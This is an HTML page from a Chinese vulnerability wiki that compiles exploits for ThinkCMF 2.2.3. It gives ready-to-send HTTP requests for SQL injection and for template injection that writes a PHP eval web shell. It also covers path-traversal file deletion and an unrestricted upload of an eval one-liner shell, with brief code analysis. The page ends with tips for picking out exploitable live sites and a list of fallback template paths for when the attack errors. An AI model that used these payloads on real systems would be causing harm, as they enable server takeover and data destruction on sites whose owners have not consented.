<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ThinkCMF/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>ThinkCMF 2.2.3 漏洞合集 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "ThinkCMF 2.2.3 \u6f0f\u6d1e\u5408\u96c6", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../ThinkCMF%20%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../ThinkCMF%20%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        ThinkCMF 框架上的任意内容包含漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../ThinkAdmin/%EF%BC%88%20CVE-2020-25540%EF%BC%89ThinkAdmin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../ThinkAdmin/%EF%BC%88%20CVE-2020-25540%EF%BC%89ThinkAdmin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
        （ CVE-2020-25540）ThinkAdmin 未授权列目录/任意文件读取
      </a>
    </div>
    
  </div>

    

    <h1 id="thinkcmf-223">ThinkCMF 2.2.3 漏洞合集<a class="headerlink" href="#thinkcmf-223" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>ThinkCMF 2.x</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="0x01">0x01 前台用户文章编辑提交存在注入<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h3>
<h4 id="0x011">0x01.1 漏洞演示<a class="headerlink" href="#0x011" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="n">前台的文章编辑中操作框架注入</span><span class="err">，</span><span class="n">所以可以直接sql注入</span>
<span class="nl">url</span><span class="p">:</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">thinkcmf</span><span class="p">.</span><span class="n">test</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">g</span><span class="o">=</span><span class="n">Portal</span><span class="o">&amp;</span><span class="n">m</span><span class="o">=</span><span class="n">Article</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">edit_post</span>
<span class="nl">post</span><span class="p">:</span>
<span class="nl">term</span><span class="p">:</span><span class="mi">123</span>
<span class="n">post</span><span class="o">[</span><span class="n">post_title</span><span class="o">]</span><span class="err">:</span><span class="mi">123</span>
<span class="n">post</span><span class="o">[</span><span class="n">post_title</span><span class="o">]</span><span class="err">:</span><span class="n">aaa</span>
<span class="nl">post_title</span><span class="p">:</span><span class="mi">123</span>
<span class="n">post</span><span class="o">[</span><span class="n">id</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="err">:</span><span class="n">bind</span>
<span class="n">post</span><span class="o">[</span><span class="n">id</span><span class="o">][</span><span class="n">1</span><span class="o">]</span><span class="err">:</span><span class="mi">0</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span>
</code></pre></div>

<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId26.png" /></p>
<h4 id="0x012">0x01.2 漏洞原理<a class="headerlink" href="#0x012" title="Permanent link">&para;</a></h4>
<p>文件：ThinkCMFX_2.2.3\application\Portal\Controller\ArticleController.class.php
方法：public function edit_post(</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId28.jpg" /></p>
<p>这里不多讲，因为没得意义。详情请看先知的历史tp漏洞，谢谢：)</p>
<h4 id="0x02-getshell">0x02 前台模版注入漏洞-可getshell两处<a class="headerlink" href="#0x02-getshell" title="Permanent link">&para;</a></h4>
<h5 id="0x021-comment">0x02.1 Comment类模版引擎注入演示<a class="headerlink" href="#0x021-comment" title="Permanent link">&para;</a></h5>
<div class="codehilite"><pre><span></span><code>url:http://thinkcmf.test/index.php?g=Comment<span class="err">&amp;</span>m=Widget<span class="err">&amp;</span>a=fetch
post:
templateFile=/../public/index
prefix=&#39;&#39;
content=<span class="nt">&lt;php&gt;</span>file_put_contents(&#39;test.php&#39;,&#39;<span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">11</span><span class="p">]);</span><span class="err">&#39;</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">php</span><span class="o">&gt;</span>
</code></pre></div>

<p>发送之后页面http状态会为200，这样就表示成功了 简单讲解一下：content
我输入了php代码所以他会在本地跟路径创建一个一句话木马test.php
所以实战过程中。</p>
<p>连接马子：<a href="http://xxxxx.com/test.php">http://xxxxx.com/test.php</a> 密码:11 即可getshell</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId32.jpg" /></p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId33.jpg" /></p>
<h4 id="0x022-api1">0x02.2 Api类模版注入1<a class="headerlink" href="#0x022-api1" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>url:http://thinkcmf.test/index.php?g=Api<span class="err">&amp;</span>m=Plugin<span class="err">&amp;</span>a=fetch
post:
templateFile=/../../../public/index
prefix=&#39;&#39;
content=<span class="nt">&lt;php&gt;</span>file_put_contents(&#39;test1.php&#39;,&#39;<span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">11</span><span class="p">]);</span><span class="err">&#39;</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">php</span><span class="o">&gt;</span>
</code></pre></div>

<p>同上一样，会在跟目录生成 马子 test1.php</p>
<h4 id="0x023">0x02.3 漏洞原理<a class="headerlink" href="#0x023" title="Permanent link">&para;</a></h4>
<p>路径:ThinkCMFX\application\Comment\Controller\WidgetController.class.php
路径:ThinkCMFX\application\Api\Controller\PluginController.class.php</p>
<p>两处的漏洞原理都是一样的，所以我就选一处进行讲解了
路径:application\Comment\Controller\WidgetController.class.php
方法：public function fetch()</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId36.jpg" /></p>
<p>从名字查看我们会发现他的3个参数</p>
<p>$templateFile=模版地址 $content=内容 $prefix=前缀</p>
<p>$templateFile就是我们要包含的文件了，我们必须包含一个不然，代码会报错，导致无法写shell
$content 我们写马子的地方 $prefix 忽略他即可，没有用的</p>
<p>在代码中我们看到一个 $templateFile
给parseTemplate函数包含了，这里我们也不用管他，因为他的作用就是判断一下文件是否存在而已，所以我们在实战的时候，可以找到一处html文件包含即可</p>
<p>而tp的模版引擎 使用的是 smarty 而smarty中只要可控制内容的key 与 value
即可写入shell命令，所以同理可得，tp的 $content 我们可控 = 有模版注入</p>
<h4 id="0x03-windows">0x03 任意文件删除-只能windows删除<a class="headerlink" href="#0x03-windows" title="Permanent link">&para;</a></h4>
<h5 id="0x031">0x03.1 漏洞演示<a class="headerlink" href="#0x031" title="Permanent link">&para;</a></h5>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId39.jpg" /></p>
<div class="codehilite"><pre><span></span><code>url：http://thinkcmf.test/index.php?g=User&amp;m=Profile&amp;a=do_avatar
post:
mgurl=..\..\..\..\..\1.txt
</code></pre></div>

<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId40.jpg" /></p>
<h4 id="0x032">0x03.2 漏洞原理<a class="headerlink" href="#0x032" title="Permanent link">&para;</a></h4>
<p>路径：ThinkCMFX\application\User\Controller\ProfileController.class.php
方法：blic function do_avatar(</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId42.jpg" /></p>
<p>从文件可以看到 $imgurl=str_replace(\'/\',\'\',$imgurl); 过滤了 /
但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数
imgurl 带入函数sp_delete_avatar 跟进去</p>
<p>路径：ThinkCMFX\application\Common\Common\function.php
方法：function sp_delete_avatar(</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId43.jpg" /></p>
<h4 id="0x04">0x04 前台任意上传漏洞<a class="headerlink" href="#0x04" title="Permanent link">&para;</a></h4>
<h5 id="0x041">0x04.1 漏洞演示<a class="headerlink" href="#0x041" title="Permanent link">&para;</a></h5>
<p>记得一定要登录! 记得一定要登录! 记得一定要登录!
记得在前台注册一个账号进行登录或是直接登录后台然后在访问此地址</p>
<div class="codehilite"><pre><span></span><code><span class="err">打开</span><span class="n">url</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">atest</span><span class="o">.</span><span class="n">test</span><span class="o">/</span><span class="n">cms</span><span class="o">/</span><span class="n">ThinkCMFX_2</span><span class="o">.</span><span class="mf">2.3</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">g</span><span class="o">=</span><span class="n">Asset</span><span class="o">&amp;</span><span class="n">m</span><span class="o">=</span><span class="n">Ueditor</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">upload</span><span class="o">&amp;</span><span class="n">action</span><span class="o">=</span><span class="n">uploadfile</span>
<span class="n">POST</span><span class="p">:</span>
<span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">php一句话木马的文件</span>

<span class="mf">1.</span><span class="n">php</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"> </span>
<span class="err">?</span><span class="o">&gt;</span>
</code></pre></div>

<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId46.png" /></p>
<div class="codehilite"><pre><span></span><code><span class="n">shell地址</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">atest</span><span class="o">.</span><span class="n">test</span><span class="o">/</span><span class="n">cms</span><span class="o">/</span><span class="n">ThinkCMFX_2</span><span class="o">.</span><span class="mf">2.3</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">ueditor</span><span class="o">/</span><span class="mi">20190724</span><span class="o">/</span><span class="mi">5</span><span class="n">d3833dcce7e3</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="mi">1</span><span class="o">=</span><span class="n">phpinfo</span><span class="p">();</span>
</code></pre></div>

<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId47.png" /></p>
<h5 id="0x042">0x04.2 为什么要登录<a class="headerlink" href="#0x042" title="Permanent link">&para;</a></h5>
<p>路径：ThinkCMFX\application\Asset\Controller\UeditorController.class.php
方法：public function _initialize()</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId49.png" /></p>
<h5 id="0x043">0x04.3 漏洞原理<a class="headerlink" href="#0x043" title="Permanent link">&para;</a></h5>
<p>路径：ThinkCMFX\application\Asset\Controller\UeditorController.class.php
方法：public function upload(</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId51.png" /></p>
<p>路径：ThinkCMFX\application\Asset\Controller\UeditorController.class.php
方法：private function _ueditor_upload</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId52.png" /></p>
<p>该方法使用 $upload_setting=sp_get_upload_setting();
先获取所有上传的配置</p>
<p>在用 $allowed_exts=explode(\',\', $upload_setting[$filetype]);
来获取允许上传的后缀</p>
<p>这里我们先跟进去查看 sp_get_upload_setting(); 函数
路径：application\Common\Common\function.php 方法：function
sp_get_upload_setting()</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId53.png" /></p>
<p>接下来我们需要重点查看一下：$upload_setting[$filetype]
我们可以打印一下,看看他的返回值 路径:
application\Asset\Controller\UeditorController.class.php 方法:
private function _ueditor_upload( 代码:
$upload_setting[$filetype]</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId54.png" /></p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId55.png" /></p>
<p>然后我们在看看他的代码 $allowed_exts=explode(\',\',
$upload_setting[$filetype]); 路径:
application\Asset\Controller\UeditorController.class.php 方法:
private function _ueditor_upload( 代码: $allowed_exts=explode(\',\',
$upload_setting[$filetype]); $upload_setting[$filetype]
执行以后返回的结果是数组并且为2:</p>
<div class="codehilite"><pre><span></span><code><span class="n">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">[</span><span class="s2">&quot;upload_max_filesize&quot;</span><span class="p">]</span><span class="o">=&gt;</span>
<span class="w">  </span><span class="n">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="s2">&quot;10240&quot;</span>
<span class="w">  </span><span class="p">[</span><span class="s2">&quot;extensions&quot;</span><span class="p">]</span><span class="o">=&gt;</span>
<span class="w">  </span><span class="n">string</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span><span class="w"> </span><span class="s2">&quot;txt,pdf,doc,docx,xls,xlsx,ppt,pptx,zip,rar&quot;</span>
<span class="p">}</span>
</code></pre></div>

<p>而这里用了php函数: explode 让我们看看这个函数的作用</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId56.png" /></p>
<p>把字符串转成数组,可是他返回的就是数组所以 $allowed_exts=explode(\',\',
$upload_setting[$filetype]); 执行返回空 让我们测试一下看看</p>
<p>路径: application\Asset\Controller\UeditorController.class.php 方法:
private function _ueditor_upload()</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId57.png" /></p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId58.png" /></p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId59.png" /></p>
<p>跟进去tp的上传方法查看一下
路径：ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php
方法：public function upload()</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId60.png" /></p>
<p>路径：ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php
方法：private function check()</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId61.png" /></p>
<p>路径：ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php
方法：private function checkExt()</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId62.png" /></p>
<p>因为这里返回了true所以实际上他并没有验证后缀
所以我们也就多了一个任意文件上传漏洞</p>
<h4 id="0x05">0x05 使用说明<a class="headerlink" href="#0x05" title="Permanent link">&para;</a></h4>
<p>前面说了，thinkcmf
并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。</p>
<h5 id="1logo-3logo">1，看logo 3的logo是黄色的例如下图<a class="headerlink" href="#1logo-3logo" title="Permanent link">&para;</a></h5>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId65.jpg" /></p>
<h5 id="2url-admin">2，在网站url 后面输入 admin<a class="headerlink" href="#2url-admin" title="Permanent link">&para;</a></h5>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId67.png" /></p>
<p>如果页面是蓝色的表示是3的，可日穿之</p>
<h5 id="3-readmemd">3，查看 README.md<a class="headerlink" href="#3-readmemd" title="Permanent link">&para;</a></h5>
<p>在网站url后面输入README.md</p>
<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId69.jpg" /></p>
<p>另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个错</p>
<div class="codehilite"><pre><span></span><code>url:http://thinkcmf.test/index.php?g=Comment<span class="err">&amp;</span>m=Widget<span class="err">&amp;</span>a=fetch
post:
templateFile=/../public/index
prefix=&#39;&#39;
content=<span class="nt">&lt;php&gt;</span>file_put_contents(&#39;test.php&#39;,&#39;<span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">11</span><span class="p">]);</span><span class="err">&#39;</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">php</span><span class="o">&gt;</span>
</code></pre></div>

<p><img alt="" src="../resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId70.jpg" /></p>
<p>请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可</p>
<div class="codehilite"><pre><span></span><code>例如：
/../public/index
/../public/exception
/../data/index
/../data/runtime/index
/../plugins/Mobileverify/View/admin_index
/../plugins/Mobileverify/View/index
/../plugins/Mobileverify/View/widget
/../plugins/Demo/View/admin_index
/../plugins/Demo/View/index
/../plugins/Demo/View/widget
/../application/Install/View/Public/footer
/../application/Install/View/Public/head
/../application/Install/View/Public/header
/../application/Common/index
/../application/Portal/Lang/en-us/index
/../application/Api/Lang/en-us/index
/../application/Api/Lang/zh-cn/index
/../application/Comment/Lang/en-us/index
/../application/Comment/Lang/zh-cn/index
url:http://thinkcmf.test/index.php?g=Api<span class="err">&amp;</span>m=Plugin<span class="err">&amp;</span>a=fetch
post:
templateFile=/../../../public/index
prefix=&#39;&#39;
content=<span class="nt">&lt;php&gt;</span>file_put_contents(&#39;test1.php&#39;,&#39;<span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">11</span><span class="p">]);</span><span class="err">&#39;</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">php</span><span class="o">&gt;</span>
<span class="o">/../../../</span><span class="k">public</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="k">public</span><span class="o">/</span><span class="nx">exception</span>
<span class="o">/../../../</span><span class="nx">data</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">data</span><span class="o">/</span><span class="nx">runtime</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">plugins</span><span class="o">/</span><span class="nx">Mobileverify</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="nx">admin_index</span>
<span class="o">/../../../</span><span class="nx">plugins</span><span class="o">/</span><span class="nx">Mobileverify</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">plugins</span><span class="o">/</span><span class="nx">Mobileverify</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="nx">widget</span>
<span class="o">/../../../</span><span class="nx">plugins</span><span class="o">/</span><span class="nx">Demo</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="nx">admin_index</span>
<span class="o">/../../../</span><span class="nx">plugins</span><span class="o">/</span><span class="nx">Demo</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">plugins</span><span class="o">/</span><span class="nx">Demo</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="nx">widget</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Install</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="k">Public</span><span class="o">/</span><span class="nx">footer</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Install</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="k">Public</span><span class="o">/</span><span class="nx">head</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Install</span><span class="o">/</span><span class="nx">View</span><span class="o">/</span><span class="k">Public</span><span class="o">/</span><span class="nb">header</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Common</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Portal</span><span class="o">/</span><span class="nx">Lang</span><span class="o">/</span><span class="nx">en</span><span class="o">-</span><span class="nx">us</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Api</span><span class="o">/</span><span class="nx">Lang</span><span class="o">/</span><span class="nx">en</span><span class="o">-</span><span class="nx">us</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Api</span><span class="o">/</span><span class="nx">Lang</span><span class="o">/</span><span class="nx">zh</span><span class="o">-</span><span class="nx">cn</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Comment</span><span class="o">/</span><span class="nx">Lang</span><span class="o">/</span><span class="nx">en</span><span class="o">-</span><span class="nx">us</span><span class="o">/</span><span class="nx">index</span>
<span class="o">/../../../</span><span class="nx">application</span><span class="o">/</span><span class="nx">Comment</span><span class="o">/</span><span class="nx">Lang</span><span class="o">/</span><span class="nx">zh</span><span class="o">-</span><span class="nx">cn</span><span class="o">/</span><span class="nx">index</span>
</code></pre></div>

<p>还有最后一句废话：模版注入对于linux 并不好用 : )
差不多了，剩下的自己去thinkcmf里面自己找</p>
<h2 id="_4">四、参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p>文章来源于<a href="https://www.yuque.com/pmiaowu/bfgkkh/aiiak1">https://www.yuque.com/pmiaowu/bfgkkh/aiiak1</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../ThinkCMF%20%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../ThinkCMF%20%E6%A1%86%E6%9E%B6%E4%B8%8A%E7%9A%84%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        ThinkCMF 框架上的任意内容包含漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../ThinkAdmin/%EF%BC%88%20CVE-2020-25540%EF%BC%89ThinkAdmin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../ThinkAdmin/%EF%BC%88%20CVE-2020-25540%EF%BC%89ThinkAdmin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
        （ CVE-2020-25540）ThinkAdmin 未授权列目录/任意文件读取
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>